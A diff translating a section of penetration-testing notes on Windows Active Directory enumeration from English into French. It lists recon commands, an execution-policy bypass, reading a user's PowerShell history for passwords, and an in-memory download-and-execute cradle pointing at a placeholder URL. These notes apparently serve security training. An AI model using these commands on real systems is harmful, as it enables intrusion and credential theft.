@@ -1387,14 +1387,30 @@ testspn2/kerberoast.inlanefreight.local       testspn2
 
 ## Living Off the Land
 
-### Basic Enumeration Commands
+### Commandes de Base pour l'Énumération
 
-| Command | Result |
-|---------|--------|
-| `hostname` | Prints the PC's Name |
-| `[System.Environment]::OSVersion.Version` | Prints out the OS version and revision level |
-| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host |
-| `ipconfig /all` | Prints out network adapter state and configurations |
-| `set` | Displays a list of environment variables for the current session (ran from CMD-prompt) |
-| `echo %USERDOMAIN%` | Displays the domain name to which the host belongs (ran from CMD-prompt) |
-| `echo %logonserver%` | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |
+| Commande | Résultat |
+|----------|----------|
+| `hostname` | Affiche le nom du PC |
+| `[System.Environment]::OSVersion.Version` | Affiche la version et le niveau de révision du système d'exploitation |
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Affiche les correctifs et les mises à jour appliqués à l'hôte |
+| `ipconfig /all` | Affiche l'état et les configurations des adaptateurs réseau |
+| `set` | Affiche une liste des variables d'environnement pour la session en cours (exécuté depuis l'invite de commande) |
+| `echo %USERDOMAIN%` | Affiche le nom de domaine auquel appartient l'hôte (exécuté depuis l'invite de commande) |
+| `echo %logonserver%` | Affiche le nom du contrôleur de domaine avec lequel l'hôte se connecte (exécuté depuis l'invite de commande) |
+
+
+### Exploiter PowerShell
+
+PowerShell existe depuis 2006 et offre aux administrateurs système Windows un cadre étendu pour administrer tous les aspects des systèmes Windows et des environnements AD. C'est un langage de script puissant qui peut être utilisé pour explorer en profondeur les systèmes. PowerShell dispose de nombreuses fonctions et modules intégrés que nous pouvons utiliser lors d'une mission pour explorer l'hôte et le réseau, ainsi que pour envoyer et recevoir des fichiers.
+
+Voici quelques-unes des façons dont PowerShell peut nous aider.
+
+| Cmd-Let | Description |
+|---------|-------------|
+| `Get-Module` | Liste les modules disponibles chargés pour utilisation. |
+| `Get-ExecutionPolicy -List` | Affiche les paramètres de la politique d'exécution pour chaque portée sur un hôte. |
+| `Set-ExecutionPolicy Bypass -Scope Process` | Cela changera la politique pour notre processus actuel en utilisant le paramètre -Scope. Cela rétablira la politique une fois que nous quitterons le processus ou le terminerons. C'est idéal car nous ne ferons pas de changement permanent sur l'hôte victime. |
+| `Get-ChildItem Env: | ft Key,Value` | Retourne les valeurs d'environnement telles que les chemins clés, les utilisateurs, les informations sur l'ordinateur, etc. |
+| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Avec cette commande, nous pouvons obtenir l'historique PowerShell de l'utilisateur spécifié. Cela peut être très utile car l'historique des commandes peut contenir des mots de passe ou nous orienter vers des fichiers de configuration ou des scripts contenant des mots de passe. |
+| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL pour télécharger le fichier'); <commandes suivantes>"` | C'est un moyen rapide et facile de télécharger un fichier depuis le web en utilisant PowerShell et de l'appeler depuis la mémoire. |
